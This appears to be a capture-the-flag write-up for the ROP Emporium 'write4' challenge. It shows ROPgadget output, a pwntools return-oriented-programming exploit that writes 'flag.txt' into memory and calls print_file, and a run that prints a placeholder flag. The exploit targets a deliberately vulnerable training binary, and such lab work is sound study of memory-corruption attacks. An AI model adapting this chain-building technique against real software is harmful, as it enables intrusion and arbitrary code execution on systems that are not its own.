



**gadget**
```shell
➜  x86_64 ROPgadget --binary ./write4 --only "pop|ret"
Gadgets information
============================================================
0x000000000040068c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040068e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400690 : pop r14 ; pop r15 ; ret        # used
0x0000000000400692 : pop r15 ; ret
0x000000000040068b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040068f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400588 : pop rbp ; ret
0x0000000000400693 : pop rdi ; ret                  # used
0x0000000000400691 : pop rsi ; pop r15 ; ret
0x000000000040068d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004e6 : ret

Unique gadgets found: 11

➜  x86_64 ROPgadget --binary ./write4 --only "mov|ret"
Gadgets information
============================================================
0x0000000000400629 : mov dword ptr [rsi], edi ; ret
0x0000000000400628 : mov qword ptr [r14], r15 ; ret     # used
0x00000000004004e6 : ret

Unique gadgets found: 3
```

# exploit
```shell
from pwn import *

pipe = process("./write4",env={"LD_PRELOAD":"./libwrite4.so"})

gadget1 = 0x400690          # pop r14 ; pop r15 ; ret
write_gadget = 0x400628     # mov qword ptr [r14], r15 ; ret
pop_rdi_ret = 0x400693
target_mem = 0x601f00
print_file = 0x400510

chain = "A" * 40
chain += p64(gadget1)
chain += p64(target_mem)    # r14
chain += b'flag.txt'        # r15
chain += p64(write_gadget)  # op write

chain += p64(pop_rdi_ret)
chain += p64(target_mem)
chain += p64(print_file)

print(pipe.recvuntil("> "))
pipe.sendline(chain)
print(pipe.recv())

```
run exp.py
```shell
➜  x86_64 python ./exp.py                     
[+] Starting local process './write4': pid 62235
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

> 
Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Stopped process './write4' (pid 62235)
```
